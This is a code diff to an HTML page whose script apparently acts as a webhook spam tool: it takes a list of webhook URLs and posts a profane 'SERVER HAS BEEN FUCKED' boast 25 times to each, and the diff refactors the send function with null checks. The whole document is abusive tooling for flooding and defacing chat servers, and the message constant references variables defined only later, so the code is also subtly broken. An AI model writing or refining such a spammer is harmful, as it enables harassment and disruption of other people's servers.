@@ -74,39 +74,48 @@ setTimeout(() => {
     // 🔒 HARD-CODED SETTINGS
     const SEND_COUNT = 25; // times per webhook
     const MESSAGE = "SERVER HAS BEEN FUCKED\nCOURTESY " + raw2 + "\n-# by " + name; // message to send
+async function send() {
+  var webhooksEl = document.getElementById("webhooks");
+  var sponsorEl = document.getElementById("sponsor");
+  var nameEl = document.getElementById("name");
 
-    async function send() {
-      const raw = document.getElementById("webhooks").value.trim();
-      var raw2 = document.getElementById("sponsor").value.trim();
-      if (!raw) return alert("At least one webhook is required");
-      var name = document.getElementById("name")?.value.trim() || "DefaultName"; 
+  if (!webhooksEl) {
+    alert("Webhooks input not found");
+    return;
+  }
 
-      const webhooks = raw
-        .split("\n")
-        .map(w => w.trim())
-        .filter(Boolean);
+  var raw = webhooksEl.value.trim();
+  var raw2 = sponsorEl ? sponsorEl.value.trim() : "";
+  var name = nameEl ? nameEl.value.trim() : "DefaultName";
 
-      const button = document.querySelector("button");
-      button.disabled = true;
+  if (!raw) return alert("At least one webhook is required");
 
-      for (const url of webhooks) {
-        for (let i = 0; i < SEND_COUNT; i++) {
-          try {
-            await fetch(url, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ content: MESSAGE })
-            });
-          } catch (e) {
-            console.error("Failed webhook:", url, e);
-          }
-        }
+  const webhooks = raw
+    .split("\n")
+    .map(w => w.trim())
+    .filter(Boolean);
+
+  var button = document.querySelector("button");
+  button.disabled = true;
+
+  for (const url of webhooks) {
+    for (let i = 0; i < SEND_COUNT; i++) {
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: MESSAGE })
+        });
+      } catch (e) {
+        console.error("Failed webhook:", url, e);
       }
-
-      alert(`Sent "${MESSAGE}" ${SEND_COUNT} time(s) to ${webhooks.length} webhook(s)`);
-      console.log(`Sent "${MESSAGE}" ${SEND_COUNT} time(s) to ${webhooks.length} webhook(s)`);
-      button.disabled = false;
     }
+  }
+
+  alert(`Sent "${MESSAGE}" ${SEND_COUNT} time(s) to ${webhooks.length} webhook(s)`);
+  button.disabled = false;
+}
+
   </script>
 </body>
 </html>
